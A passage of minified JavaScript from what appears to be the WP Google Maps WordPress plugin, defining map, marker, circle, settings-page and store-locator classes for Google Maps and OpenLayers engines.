"+this.east+"E"},WPGMZA.LatLngBounds.prototype.toLiteral=function(){return{north:this.north,south:this.south,west:this.west,east:this.east}}})),jQuery((function(e){"map-edit"==WPGMZA.currentPage&&(WPGMZA.MapEditPage=function(){var t=this;if(this.themePanel=new WPGMZA.ThemePanel,this.themeEditor=new WPGMZA.ThemeEditor,this.map=WPGMZA.maps[0],"yes"==WPGMZA.settings.wpgmza_settings_map_scroll||"yes"==WPGMZA.settings.wpgmza_settings_map_draggable||"yes"==WPGMZA.settings.wpgmza_settings_map_clickzoom){var o=e("<div class='notice notice-info wpgmza_disabled_interactions_notice' style= 'height: 45px; padding: 7px 5px 2px 5px;'><p style='float: left; padding-top: 10px;'>"+WPGMZA.localized_strings.disabled_interactions_notice+"</p><a class='button button-primary enable_interactions_notice_button' style='float: right;'>"+WPGMZA.localized_strings.disabled_interactions_button+"</a></div>");e(".wpgmza_map").after(o),e(".enable_interactions_notice_button").on("click",(function(){WPGMZA.mapEditPage.map.enableAllInteractions(),e(o).fadeOut("slow");var t=e("<div class='notice notice-success'><p>"+WPGMZA.localized_strings.interactions_enabled_notice+"</p></div>");e(WPGMZA.mapEditPage.map.element).after(t),e(t).delay(2e3).fadeIn("slow"),e(t).delay(4e3).fadeOut("slow")}))}e("#wpgmza_max_zoom, #wpgmza_min_zoom").on("change input",(function(e){t.onZoomLimitChanged(e)}))},WPGMZA.MapEditPage.createInstance=function(){return WPGMZA.isProVersion()&&WPGMZA.Version.compare(WPGMZA.pro_version,"8.0.0")>=WPGMZA.Version.EQUAL_TO?new WPGMZA.ProMapEditPage:new WPGMZA.MapEditPage},WPGMZA.MapEditPage.prototype.onZoomLimitChanged=function(t){this.map.setOptions({minZoom:e("#wpgmza_max_zoom").val(),maxZoom:e("#wpgmza_min_zoom").val()})},e(window).on("load",(function(e){WPGMZA.mapEditPage=WPGMZA.MapEditPage.createInstance()})))})),jQuery((function(e){WPGMZA.MapObject=function(e){if(WPGMZA.assertInstanceOf(this,"MapObject"),WPGMZA.EventDispatcher.call(this),this.id=-1,this.map_id=null,this.guid=WPGMZA.guid(),this.modified=!0,this.settings={},e)for(var t in e)if("settings"==t){if(null==e.settings)this.settings={};else switch(typeof e.settings){case"string":this.settings=JSON.parse(e[t]);break;case"object":this.settings=e[t];break;default:throw new Error("Don't know how to interpret settings")}for(var t in this.settings){var o=this.settings[t];String(o).match(/^-?\d+$/)&&(this.settings[t]=parseInt(o))}}else this[t]=e[t]},WPGMZA.MapObject.prototype=Object.create(WPGMZA.EventDispatcher.prototype),WPGMZA.MapObject.prototype.constructor=WPGMZA.MapObject,WPGMZA.MapObject.prototype.parseGeometry=function(e){var t,o,n=[];if("object"==typeof e)return e;t=e.replace(/[^ ,\d\.\-+e]/g,"").split(",");for(var a=0;a<t.length;a++)o=t[a].split(" "),n.push({lat:parseFloat(o[1]),lng:parseFloat(o[0])});return n},WPGMZA.MapObject.prototype.toJSON=function(){return{id:this.id,guid:this.guid,settings:this.settings}}})),jQuery((function(e){var t=WPGMZA.MapObject;WPGMZA.Circle=function(e,o){WPGMZA.assertInstanceOf(this,"Circle"),this.center=new WPGMZA.LatLng,this.radius=100,t.apply(this,arguments)},WPGMZA.Circle.prototype=Object.create(t.prototype),WPGMZA.Circle.prototype.constructor=WPGMZA.Circle,WPGMZA.Circle.createInstance=function(e){var t;if("open-layers"===WPGMZA.settings.engine)t=WPGMZA.OLCircle;else t=WPGMZA.GoogleCircle;return new t(e)},WPGMZA.Circle.prototype.getCenter=function(){return this.center.clone()},WPGMZA.Circle.prototype.setCenter=function(e){this.center.lat=e.lat,this.center.lng=e.lng},WPGMZA.Circle.prototype.getRadius=function(){return this.radius},WPGMZA.Circle.prototype.setRadius=function(e){this.radius=e},WPGMZA.Circle.prototype.getMap=function(){return this.map},WPGMZA.Circle.prototype.setMap=function(e){this.map&&this.map.removeCircle(this),e&&e.addCircle(this)}})),jQuery((function(e){WPGMZA.MapSettingsPage=function(){var t=this;this._keypressHistory=[],this.updateEngineSpecificControls(),this.updateGDPRControls(),e("#wpgmza-developer-mode").hide(),e(window).on("keypress",(function(e){t.onKeyPress(e)})),e("select[name='wpgmza_maps_engine']").on("change",(function(e){t.updateEngineSpecificControls()})),e("input[name='wpgmza_gdpr_require_consent_before_load'], input[name='wpgmza_gdpr_require_consent_before_vgm_submit'], input[name='wpgmza_gdpr_override_notice']").on("change",(function(e){t.updateGDPRControls()}))},WPGMZA.MapSettingsPage.createInstance=function(){return new WPGMZA.MapSettingsPage},WPGMZA.MapSettingsPage.prototype.updateEngineSpecificControls=function(){var t=e("select[name='wpgmza_maps_engine']").val();e("[data-required-maps-engine][data-required-maps-engine!='"+t+"']").hide(),e("[data-required-maps-engine='"+t+"']").show()},WPGMZA.MapSettingsPage.prototype.updateGDPRControls=function(){var t=e("input[name='wpgmza_gdpr_require_consent_before_load']").prop("checked"),o=e("input[name='wpgmza_gdpr_require_consent_before_vgm_submit']");o.length&&(t=t||o.prop("checked"));var n=t&&e("input[name='wpgmza_gdpr_override_notice']").prop("checked");t?e("#wpgmza-gdpr-compliance-notice").show("slow"):e("#wpgmza-gdpr-compliance-notice").hide("slow"),n?e("#wpgmza_gdpr_override_notice_text").show("slow"):e("#wpgmza_gdpr_override_notice_text").hide("slow")},WPGMZA.MapSettingsPage.prototype.flushGeocodeCache=function(){(new WPGMZA.OLGeocoder).clearCache((function(e){jQuery("#wpgmza_flush_cache_btn").removeAttr("disabled")}))},WPGMZA.MapSettingsPage.prototype.onKeyPress=function(t){this._keypressHistory.push(t.key),9<this._keypressHistory.length&&(this._keypressHistory=this._keypressHistory.slice(this._keypressHistory.length-9)),"codecabin"!=this._keypressHistory.join("")||this._developerModeRevealed||(e("#wpgmza-developer-mode").show(),this._developerModeRevealed=!0)},jQuery((function(e){window.location.href.match(/wp-google-maps-menu-settings/)&&(WPGMZA.mapSettingsPage=WPGMZA.MapSettingsPage.createInstance(),jQuery(document).ready((function(){jQuery("#wpgmza_flush_cache_btn").on("click",(function(){jQuery(this).attr("disabled","disabled"),WPGMZA.mapSettingsPage.flushGeocodeCache()}))})))}))})),jQuery((function(e){WPGMZA.MapSettings=function(e){var t,o=this,n=e.getAttribute("data-settings");try{t=JSON.parse(n)}catch(e){n=(n=n.replace(/\\%/g,"%")).replace(/\\\\"/g,'\\"');try{t=JSON.parse(n)}catch(e){t={},console.warn("Failed to parse map settings JSON")}}function a(e){if(e)for(var t in e)if("other_settings"!=t){var n=e[t];String(n).match(/^-?\d+$/)&&(n=parseInt(n)),o[t]=n}}WPGMZA.assertInstanceOf(this,"MapSettings"),a(WPGMZA.settings),a(t),t&&t.other_settings&&a(t.other_settings)},WPGMZA.MapSettings.prototype.toOLViewOptions=function(){var e=this,t={center:ol.proj.fromLonLat([-119.4179,36.7783]),zoom:4};function o(t){return!("object"==typeof e[t]||e[t]&&e[t].length)}if("string"==typeof this.start_location){var n=this.start_location.replace(/^\(|\)$/g,"").split(",");WPGMZA.isLatLngString(this.start_location)?t.center=ol.proj.fromLonLat([parseFloat(n[1]),parseFloat(n[0])]):console.warn("Invalid start location")}return this.center&&(t.center=ol.proj.fromLonLat([parseFloat(this.center.lng),parseFloat(this.center.lat)])),o("map_start_lat")||o("map_start_lng")||(t.center=ol.proj.fromLonLat([parseFloat(this.map_start_lng),parseFloat(this.map_start_lat)])),this.zoom&&(t.zoom=parseInt(this.zoom)),this.start_zoom&&(t.zoom=parseInt(this.start_zoom)),this.map_min_zoom&&this.map_max_zoom&&(t.minZoom=Math.min(this.map_min_zoom,this.map_max_zoom),t.maxZoom=Math.max(this.map_min_zoom,this.map_max_zoom)),t},WPGMZA.MapSettings.prototype.toGoogleMapsOptions=function(){var t=this,o=this.start_location&&this.start_location.length?this.start_location.split(","):[36.7783,-119.4179];function n(e){return!("object"==typeof t[e]||t[e]&&t[e].length)}function a(t){return e.isNumeric(t)?t:parseFloat(String(t).replace(/[\(\)\s]/,""))}var r=new google.maps.LatLng(a(o[0]),a(o[1])),i=this.start_zoom?parseInt(this.start_zoom):4;!this.start_zoom&&this.zoom&&(i=parseInt(this.zoom));var s={zoom:i,center:r};switch(n("center")||(s.center=new google.maps.LatLng({lat:parseFloat(this.center.lat),lng:parseFloat(this.center.lng)})),n("map_start_lat")||n("map_start_lng")||(s.center=new google.maps.LatLng({lat:parseFloat(this.map_start_lat),lng:parseFloat(this.map_start_lng)})),this.map_min_zoom&&this.map_max_zoom&&(s.minZoom=Math.min(this.map_min_zoom,this.map_max_zoom),s.maxZoom=Math.max(this.map_min_zoom,this.map_max_zoom)),s.zoomControl=!("yes"==this.wpgmza_settings_map_zoom),s.panControl=!("yes"==this.wpgmza_settings_map_pan),s.mapTypeControl=!("yes"==this.wpgmza_settings_map_type),s.streetViewControl=!("yes"==this.wpgmza_settings_map_streetview),s.fullscreenControl=!("yes"==this.wpgmza_settings_map_full_screen_control),s.draggable=!("yes"==this.wpgmza_settings_map_draggable),s.disableDoubleClickZoom="yes"==this.wpgmza_settings_map_clickzoom,this.wpgmza_settings_map_scroll&&(s.scrollwheel=!1),"greedy"==this.wpgmza_force_greedy_gestures||"yes"==this.wpgmza_force_greedy_gestures?s.gestureHandling="greedy":s.gestureHandling="cooperative",parseInt(this.type)){case 2:s.mapTypeId=google.maps.MapTypeId.SATELLITE;break;case 3:s.mapTypeId=google.maps.MapTypeId.HYBRID;break;case 4:s.mapTypeId=google.maps.MapTypeId.TERRAIN;break;default:s.mapTypeId=google.maps.MapTypeId.ROADMAP}return this.wpgmza_theme_data&&this.wpgmza_theme_data.length&&(s.styles=WPGMZA.GoogleMap.parseThemeData(this.wpgmza_theme_data)),s}})),jQuery((function(e){function t(e){return e*(Math.PI/180)}WPGMZA.Map=function(t,o){if(WPGMZA.assertInstanceOf(this,"Map"),WPGMZA.EventDispatcher.call(this),!(t instanceof HTMLElement))throw new Error("Argument must be a HTMLElement");if(t.hasAttribute("data-map-id")?this.id=t.getAttribute("data-map-id"):this.id=1,!/\d+/.test(this.id))throw new Error("Map ID must be an integer");if(WPGMZA.maps.push(this),this.element=t,(this.element.wpgmzaMap=this).engineElement=t,this.markers=[],this.polygons=[],this.polylines=[],this.circles=[],this.rectangles=[],this.loadSettings(o),this.shortcodeAttributes={},e(this.element).attr("data-shortcode-attributes"))try{this.shortcodeAttributes=JSON.parse(e(this.element).attr("data-shortcode-attributes"))}catch(e){console.warn("Error parsing shortcode attributes")}WPGMZA.getCurrentPage()!=WPGMZA.PAGE_MAP_EDIT&&this.initStoreLocator(),this.markerFilter=WPGMZA.MarkerFilter.createInstance(this)},WPGMZA.Map.prototype=Object.create(WPGMZA.EventDispatcher.prototype),WPGMZA.Map.prototype.constructor=WPGMZA.Map,WPGMZA.Map.nightTimeThemeData=[{elementType:"geometry",stylers:[{color:"#242f3e"}]},{elementType:"labels.text.fill",stylers:[{color:"#746855"}]},{elementType:"labels.text.stroke",stylers:[{color:"#242f3e"}]},{featureType:"administrative.locality",elementType:"labels.text.fill",stylers:[{color:"#d59563"}]},{featureType:"landscape",elementType:"geometry.fill",stylers:[{color:"#575663"}]},{featureType:"poi",elementType:"labels.text.fill",stylers:[{color:"#d59563"}]},{featureType:"poi.park",elementType:"geometry",stylers:[{color:"#263c3f"}]},{featureType:"poi.park",elementType:"labels.text.fill",stylers:[{color:"#6b9a76"}]},{featureType:"road",elementType:"geometry",stylers:[{color:"#38414e"}]},{featureType:"road",elementType:"geometry.stroke",stylers:[{color:"#212a37"}]},{featureType:"road",elementType:"labels.text.fill",stylers:[{color:"#9ca5b3"}]},{featureType:"road.highway",elementType:"geometry",stylers:[{color:"#746855"}]},{featureType:"road.highway",elementType:"geometry.fill",stylers:[{color:"#80823e"}]},{featureType:"road.highway",elementType:"geometry.stroke",stylers:[{color:"#1f2835"}]},{featureType:"road.highway",elementType:"labels.text.fill",stylers:[{color:"#f3d19c"}]},{featureType:"transit",elementType:"geometry",stylers:[{color:"#2f3948"}]},{featureType:"transit.station",elementType:"labels.text.fill",stylers:[{color:"#d59563"}]},{featureType:"water",elementType:"geometry",stylers:[{color:"#17263c"}]},{featureType:"water",elementType:"geometry.fill",stylers:[{color:"#1b737a"}]},{featureType:"water",elementType:"labels.text.fill",stylers:[{color:"#515c6d"}]},{featureType:"water",elementType:"labels.text.stroke",stylers:[{color:"#17263c"}]}],WPGMZA.Map.getConstructor=function(){return"open-layers"===WPGMZA.settings.engine?WPGMZA.isProVersion()?WPGMZA.OLProMap:WPGMZA.OLMap:WPGMZA.isProVersion()?WPGMZA.GoogleProMap:WPGMZA.GoogleMap},WPGMZA.Map.createInstance=function(e,t){return new(WPGMZA.Map.getConstructor())(e,t)},Object.defineProperty(WPGMZA.Map.prototype,"lat",{get:function(){return this.getCenter().lat},set:function(e){var t=this.getCenter();t.lat=e,this.setCenter(t)}}),Object.defineProperty(WPGMZA.Map.prototype,"lng",{get:function(){return this.getCenter().lng},set:function(e){var t=this.getCenter();t.lng=e,this.setCenter(t)}}),Object.defineProperty(WPGMZA.Map.prototype,"zoom",{get:function(){return this.getZoom()},set:function(e){this.setZoom(e)}}),WPGMZA.Map.prototype.loadSettings=function(e){var t=new WPGMZA.MapSettings(this.element);if(t.other_settings,delete t.other_settings,e)for(var o in e)t[o]=e[o];this.settings=t},WPGMZA.Map.prototype.initStoreLocator=function(){var t=e(".wpgmza_sl_main_div");t.length&&(this.storeLocator=WPGMZA.StoreLocator.createInstance(this,t[0]))},WPGMZA.Map.prototype.setOptions=function(e){for(var t in e)this.settings[t]=e[t]},Math.PI,WPGMZA.Map.getGeographicDistance=function(e,o,n,a){var r=t(n-e),i=t(a-o),s=Math.sin(r/2)*Math.sin(r/2)+Math.cos(t(e))*Math.cos(t(n))*Math.sin(i/2)*Math.sin(i/2);return 2*Math.atan2(Math.sqrt(s),Math.sqrt(1-s))*6371},WPGMZA.Map.prototype.setCenter=function(e){if(!("lat"in e)||!("lng"in e))throw new Error("Argument is not an object with lat and lng")},WPGMZA.Map.prototype.setDimensions=function(t,o){e(this.element).css({width:t}),e(this.engineElement).css({width:"100%",height:o})},WPGMZA.Map.prototype.addMarker=function(e){if(!(e instanceof WPGMZA.Marker))throw new Error("Argument must be an instance of WPGMZA.Marker");e.map=this,(e.parent=this).markers.push(e),this.dispatchEvent({type:"markeradded",marker:e}),e.dispatchEvent({type:"added"})},WPGMZA.Map.prototype.removeMarker=function(e){if(!(e instanceof WPGMZA.Marker))throw new Error("Argument must be an instance of WPGMZA.Marker");if(e.map!==this)throw new Error("Wrong map error");e.infoWindow&&e.infoWindow.close(),e.map=null,e.parent=null,this.markers.splice(this.markers.indexOf(e),1),this.dispatchEvent({type:"markerremoved",marker:e}),e.dispatchEvent({type:"removed"})},WPGMZA.Map.prototype.getMarkerByID=function(e){for(var t=0;t<this.markers.length;t++)if(this.markers[t].id==e)return this.markers[t];return null},WPGMZA.Map.prototype.getMarkerByTitle=function(e){if("string"==typeof e){for(var t=0;t<this.markers.length;t++)if(this.markers[t].title==e)return this.markers[t]}else{if(!(e instanceof RegExp))throw new Error("Invalid argument");for(t=0;t<this.markers.length;t++)if(e.test(this.markers[t].title))return this.markers[t]}return null},WPGMZA.Map.prototype.removeMarkerByID=function(e){var t=this.getMarkerByID(e);t&&this.removeMarker(t)},WPGMZA.Map.prototype.addPolygon=function(e){if(!(e instanceof WPGMZA.Polygon))throw new Error("Argument must be an instance of WPGMZA.Polygon");(e.map=this).polygons.push(e),this.dispatchEvent({type:"polygonadded",polygon:e})},WPGMZA.Map.prototype.removePolygon=function(e){if(!(e instanceof WPGMZA.Polygon))throw new Error("Argument must be an instance of WPGMZA.Polygon");if(e.map!==this)throw new Error("Wrong map error");e.map=null,this.polygons.splice(this.polygons.indexOf(e),1),this.dispatchEvent({type:"polygonremoved",polygon:e})},WPGMZA.Map.prototype.getPolygonByID=function(e){for(var t=0;t<this.polygons.length;t++)if(this.polygons[t].id==e)return this.polygons[t];return null},WPGMZA.Map.prototype.removePolygonByID=function(e){var t=this.getPolygonByID(e);t&&this.removePolygon(t)},WPGMZA.Map.prototype.getPolylineByID=function(e){for(var t=0;t<this.polylines.length;t++)if(this.polylines[t].id==e)return this.polylines[t];return null},WPGMZA.Map.prototype.addPolyline=function(e){if(!(e instanceof WPGMZA.Polyline))throw new Error("Argument must be an instance of WPGMZA.Polyline");(e.map=this).polylines.push(e),this.dispatchEvent({type:"polylineadded",polyline:e})},WPGMZA.Map.prototype.removePolyline=function(e){if(!(e instanceof WPGMZA.Polyline))throw new Error("Argument must be an instance of WPGMZA.Polyline");if(e.map!==this)throw new Error("Wrong map error");e.map=null,this.polylines.splice(this.polylines.indexOf(e),1),this.dispatchEvent({type:"polylineremoved",polyline:e})},WPGMZA.Map.prototype.getPolylineByID=function(e){for(var t=0;t<this.polylines.length;t++)if(this.polylines[t].id==e)return this.polylines[t];return null},WPGMZA.Map.prototype.removePolylineByID=function(e){var t=this.getPolylineByID(e);t&&this.removePolyline(t)},WPGMZA.Map.prototype.addCircle=function(e){if(!(e instanceof WPGMZA.Circle))throw new Error("Argument must be an instance of WPGMZA.Circle");(e.map=this).circles.push(e),this.dispatchEvent({type:"circleadded",circle:e})},WPGMZA.Map.prototype.removeCircle=function(e){if(!(e instanceof WPGMZA.Circle))throw new Error("Argument must be an instance of WPGMZA.Circle");if(e.map!==this)throw new Error("Wrong map error");e.map=null,this.circles.splice(this.circles.indexOf(e),1),this.dispatchEvent({type:"circleremoved",circle:e})},WPGMZA.Map.prototype.getCircleByID=function(e){for(var t=0;t<this.circles.length;t++)if(this.circles[t].id==e)return this.circles[t];return null},WPGMZA.Map.prototype.removeCircleByID=function(e){var t=this.getCircleByID(e);t&&this.removeCircle(t)},WPGMZA.Map.prototype.nudgeLatLng=function(e,t,o){var n=this.latLngToPixels(e);if(n.x+=parseFloat(t),n.y+=parseFloat(o),isNaN(n.x)||isNaN(n.y))throw new Error("Invalid coordinates supplied");return this.pixelsToLatLng(n)},WPGMZA.Map.prototype.nudge=function(e,t){var o=this.nudgeLatLng(this.getCenter(),e,t);this.setCenter(o)},WPGMZA.Map.prototype.animateNudge=function(t,o,n,a){var r;if(n){if(!(n instanceof WPGMZA.LatLng))throw new Error("Origin must be an instance of WPGMZA.LatLng")}else n=this.getCenter();r=this.nudgeLatLng(n,t,o),a=a||WPGMZA.getScrollAnimationDuration(),e(this).animate({lat:r.lat,lng:r.lng},a)},WPGMZA.Map.prototype.onWindowResize=function(e){},WPGMZA.Map.prototype.onElementResized=function(e){},WPGMZA.Map.prototype.onBoundsChanged=function(e){this.trigger("boundschanged"),this.trigger("bounds_changed")},WPGMZA.Map.prototype.onIdle=function(e){this.trigger("idle")},WPGMZA.Map.prototype.hasVisibleMarkers=function(e){var t=0;for(var o in marker_array){var n=marker_array[o];if(n.isFilterable&&n.getMap()){t++;break}}return 0<t},WPGMZA.Map.prototype.closeAllInfoWindows=function(){this.markers.forEach((function(e){e.infoWindow&&e.infoWindow.close()}))}})),jQuery((function(e){WPGMZA.MapsEngineDialog=function(t){var o=this;this.element=t,window.wpgmzaUnbindSaveReminder&&window.wpgmzaUnbindSaveReminder(),e(t).show(),e(t).remodal().open(),e(t).find("input:radio").on("change",(function(t){e("#wpgmza-confirm-engine").prop("disabled",!1)})),e("#wpgmza-confirm-engine").on("click",(function(e){o.onButtonClicked(e)}))},WPGMZA.MapsEngineDialog.prototype.onButtonClicked=function(t){e(t.target).prop("disabled",!0),e.ajax(WPGMZA.ajaxurl,{method:"POST",data:{action:"wpgmza_maps_engine_dialog_set_engine",engine:e("[name='wpgmza_maps_engine']:checked").val(),nonce:e("#wpgmza-maps-engine-dialog").attr("data-ajax-nonce")},success:function(e,t,o){window.location.reload()}})},e(window).on("load",(function(t){var o=e("#wpgmza-maps-engine-dialog");o.length&&(WPGMZA.settings.wpgmza_maps_engine_dialog_done||WPGMZA.settings.wpgmza_google_maps_api_key&&WPGMZA.settings.wpgmza_google_maps_api_key.length||(WPGMZA.mapsEngineDialog=new WPGMZA.MapsEngineDialog(o)))}))})),jQuery((function(e){WPGMZA.MarkerFilter=function(e){WPGMZA.EventDispatcher.call(this),this.map=e},WPGMZA.MarkerFilter.prototype=Object.create(WPGMZA.EventDispatcher.prototype),WPGMZA.MarkerFilter.prototype.constructor=WPGMZA.MarkerFilter,WPGMZA.MarkerFilter.createInstance=function(e){return new WPGMZA.MarkerFilter(e)},WPGMZA.MarkerFilter.prototype.getFilteringParameters=function(){var t={map_id:this.map.id};return this.map.storeLocator&&(t=e.extend(t,this.map.storeLocator.getFilteringParameters())),t},WPGMZA.MarkerFilter.prototype.update=function(){},WPGMZA.MarkerFilter.prototype.onFilteringComplete=function(e){}})),jQuery((function(e){WPGMZA.MarkerPanel=function(e){this.element=e},e(window).on("load",(function(t){WPGMZA.getCurrentPage()==WPGMZA.PAGE_MAP_EDIT&&(WPGMZA.mapEditPage.markerPanel=new WPGMZA.MarkerPanel(e("#wpgmza-marker-edit-panel")[0]))}))})),jQuery((function(e){WPGMZA.Marker=function(e){var t=this;this._offset={x:0,y:0},WPGMZA.assertInstanceOf(this,"Marker"),this.lat="36.778261",this.lng="-119.4179323999",this.address="California",this.title=null,this.description="",this.link="",this.icon="",this.approved=1,this.pic=null,this.isFilterable=!0,this.disableInfoWindow=!1,WPGMZA.MapObject.apply(this,arguments),e&&e.heatmap||(e&&this.on("init",(function(t){e.position&&this.setPosition(e.position),e.map&&e.map.addMarker(this)})),this.addEventListener("added",(function(e){t.onAdded(e)})),this.handleLegacyGlobals(e))},WPGMZA.Marker.prototype=Object.create(WPGMZA.MapObject.prototype),WPGMZA.Marker.prototype.constructor=WPGMZA.Marker,WPGMZA.Marker.getConstructor=function(){return"open-layers"===WPGMZA.settings.engine?WPGMZA.isProVersion()?WPGMZA.OLProMarker:WPGMZA.OLMarker:WPGMZA.isProVersion()?WPGMZA.GoogleProMarker:WPGMZA.GoogleMarker},WPGMZA.Marker.createInstance=function(e){return new(WPGMZA.Marker.getConstructor())(e)},WPGMZA.Marker.ANIMATION_NONE="0",WPGMZA.Marker.ANIMATION_BOUNCE="1",WPGMZA.Marker.ANIMATION_DROP="2",Object.defineProperty(WPGMZA.Marker.prototype,"offsetX",{get:function(){return this._offset.x},set:function(e){this._offset.x=e,this.updateOffset()}}),Object.defineProperty(WPGMZA.Marker.prototype,"offsetY",{get:function(){return this._offset.y},set:function(e){this._offset.y=e,this.updateOffset()}}),WPGMZA.Marker.prototype.onAdded=function(e){var t=this;this.addEventListener("click",(function(e){t.onClick(e)})),this.addEventListener("mouseover",(function(e){t.onMouseOver(e)})),this.addEventListener("select",(function(e){t.onSelect(e)})),this.map.settings.marker==this.id&&t.trigger("select"),"1"==this.infoopen&&this.openInfoWindow()},WPGMZA.Marker.prototype.handleLegacyGlobals=function(t){var o;if(WPGMZA.settings.useLegacyGlobals&&this.map_id&&this.id&&!(WPGMZA.pro_version&&(o=WPGMZA.pro_version.match(/\d+/))&&o[0]<=7)){window.marker_array||(window.marker_array={}),marker_array[this.map_id]||(marker_array[this.map_id]=[]),marker_array[this.map_id][this.id]=this,window.wpgmaps_localize_marker_data||(window.wpgmaps_localize_marker_data={}),wpgmaps_localize_marker_data[this.map_id]||(wpgmaps_localize_marker_data[this.map_id]=[]);var n=e.extend({marker_id:this.id},t);wpgmaps_localize_marker_data[this.map_id][this.id]=n}},WPGMZA.Marker.prototype.initInfoWindow=function(){this.infoWindow||(this.infoWindow=WPGMZA.InfoWindow.createInstance())},WPGMZA.Marker.prototype.openInfoWindow=function(){this.map?"map-edit"==WPGMZA.currentPage&&!WPGMZA.pro_version||(this.map.lastInteractedMarker&&this.map.lastInteractedMarker.infoWindow.close(),(this.map.lastInteractedMarker=this).initInfoWindow(),this.infoWindow.open(this.map,this)):console.warn("Cannot open infowindow for marker with no map")},WPGMZA.Marker.prototype.onClick=function(e){},WPGMZA.Marker.prototype.onSelect=function(e){this.openInfoWindow()},WPGMZA.Marker.prototype.onMouseOver=function(e){this.map.settings.info_window_open_by==WPGMZA.InfoWindow.OPEN_BY_HOVER&&this.openInfoWindow()},WPGMZA.Marker.prototype.getIcon=function(){function e(e){return"string"!=typeof e?e:e.replace(/^http(s?):/,"")}return WPGMZA.defaultMarkerIcon?e(WPGMZA.defaultMarkerIcon):e(WPGMZA.settings.default_marker_icon)},WPGMZA.Marker.prototype.getPosition=function(){return new WPGMZA.LatLng({lat:parseFloat(this.lat),lng:parseFloat(this.lng)})},WPGMZA.Marker.prototype.setPosition=function(e){e instanceof WPGMZA.LatLng?(this.lat=e.lat,this.lng=e.lng):(this.lat=parseFloat(e.lat),this.lng=parseFloat(e.lng))},WPGMZA.Marker.prototype.setOffset=function(e,t){this._offset.x=e,this._offset.y=t,this.updateOffset()},WPGMZA.Marker.prototype.updateOffset=function(){},WPGMZA.Marker.prototype.getAnimation=function(e){return this.settings.animation},WPGMZA.Marker.prototype.setAnimation=function(e){this.settings.animation=e},WPGMZA.Marker.prototype.getVisible=function(){},WPGMZA.Marker.prototype.setVisible=function(e){!e&&this.infoWindow&&this.infoWindow.close()},WPGMZA.Marker.prototype.getMap=function(){return this.map},WPGMZA.Marker.prototype.setMap=function(e){e?e.addMarker(this):this.map&&this.map.removeMarker(this),this.map=e},WPGMZA.Marker.prototype.getDraggable=function(){},WPGMZA.Marker.prototype.setDraggable=function(e){},WPGMZA.Marker.prototype.setOptions=function(e){},WPGMZA.Marker.prototype.setOpacity=function(e){},WPGMZA.Marker.prototype.panIntoView=function(){if(!this.map)throw new Error("Marker hasn't been added to a map");this.map.setCenter(this.getPosition())},WPGMZA.Marker.prototype.toJSON=function(){var t=WPGMZA.MapObject.prototype.toJSON.call(this),o=this.getPosition();return e.extend(t,{lat:o.lat,lng:o.lng,address:this.address,title:this.title,description:this.description,link:this.link,icon:this.icon,pic:this.pic,approved:this.approved}),t}})),jQuery((function(e){WPGMZA.ModernStoreLocatorCircle=function(t,o){var n;n=WPGMZA.isProVersion()?this.map=MYMAP[t].map:this.map=MYMAP.map,this.map_id=t,this.mapElement=n.element,this.mapSize={width:e(this.mapElement).width(),height:e(this.mapElement).height()},this.initCanvasLayer(),this.settings={center:new WPGMZA.LatLng(0,0),radius:1,color:"#63AFF2",shadowColor:"white",shadowBlur:4,centerRingRadius:10,centerRingLineWidth:3,numInnerRings:9,innerRingLineWidth:1,innerRingFade:!0,numOuterRings:7,ringLineWidth:1,mainRingLineWidth:2,numSpokes:6,spokesStartAngle:Math.PI/2,numRadiusLabels:6,radiusLabelsStartAngle:Math.PI/2,radiusLabelFont:"13px sans-serif",visible:!1},o&&this.setOptions(o)},WPGMZA.ModernStoreLocatorCircle.createInstance=function(e,t){return"google-maps"==WPGMZA.settings.engine?new WPGMZA.GoogleModernStoreLocatorCircle(e,t):new WPGMZA.OLModernStoreLocatorCircle(e,t)},WPGMZA.ModernStoreLocatorCircle.prototype.initCanvasLayer=function(){},WPGMZA.ModernStoreLocatorCircle.prototype.onResize=function(e){this.draw()},WPGMZA.ModernStoreLocatorCircle.prototype.onUpdate=function(e){this.draw()},WPGMZA.ModernStoreLocatorCircle.prototype.setOptions=function(e){for(var t in e){var o="set"+t.substr(0,1).toUpperCase()+t.substr(1);"function"==typeof this[o]?this[o](e[t]):this.settings[t]=e[t]}},WPGMZA.ModernStoreLocatorCircle.prototype.getResolutionScale=function(){return window.devicePixelRatio||1},WPGMZA.ModernStoreLocatorCircle.prototype.getCenter=function(){return this.getPosition()},WPGMZA.ModernStoreLocatorCircle.prototype.setCenter=function(e){this.setPosition(e)},WPGMZA.ModernStoreLocatorCircle.prototype.getPosition=function(){return this.settings.center},WPGMZA.ModernStoreLocatorCircle.prototype.setPosition=function(e){this.settings.center=e},WPGMZA.ModernStoreLocatorCircle.prototype.getRadius=function(){return this.settings.radius},WPGMZA.ModernStoreLocatorCircle.prototype.setRadius=function(e){if(isNaN(e))throw new Error("Invalid radius");this.settings.radius=e},WPGMZA.ModernStoreLocatorCircle.prototype.getVisible=function(){return this.settings.visible},WPGMZA.ModernStoreLocatorCircle.prototype.setVisible=function(e){this.settings.visible=e},WPGMZA.ModernStoreLocatorCircle.prototype.getTransformedRadius=function(e){throw new Error("Abstract function called")},WPGMZA.ModernStoreLocatorCircle.prototype.getContext=function(e){throw new Error("Abstract function called")},WPGMZA.ModernStoreLocatorCircle.prototype.getCanvasDimensions=function(){throw new Error("Abstract function called")},WPGMZA.ModernStoreLocatorCircle.prototype.validateSettings=function(){WPGMZA.isHexColorString(this.settings.color)||(this.settings.color="#63AFF2")},WPGMZA.ModernStoreLocatorCircle.prototype.draw=function(){this.validateSettings();var e=this.settings,t=this.getCanvasDimensions(),o=t.width,n=t.height;if(this.map,this.getResolutionScale(),context=this.getContext("2d"),context.clearRect(0,0,o,n),e.visible){context.shadowColor=e.shadowColor,context.shadowBlur=e.shadowBlur,context.setTransform(1,0,0,1,0,0);var a=this.getScale();context.scale(a,a);var r=this.getWorldOriginOffset();context.translate(r.x,r.y),new WPGMZA.LatLng(this.settings.center);var i=this.getCenterPixels(),s=WPGMZA.hexToRgba(e.color),l=this.getTransformedRadius(e.radius)/(e.numInnerRings+1);context.strokeStyle=e.color,context.lineWidth=1/a*e.centerRingLineWidth,context.beginPath(),context.arc(i.x,i.y,this.getTransformedRadius(e.centerRingRadius)/a,0,2*Math.PI),context.stroke(),context.closePath();var 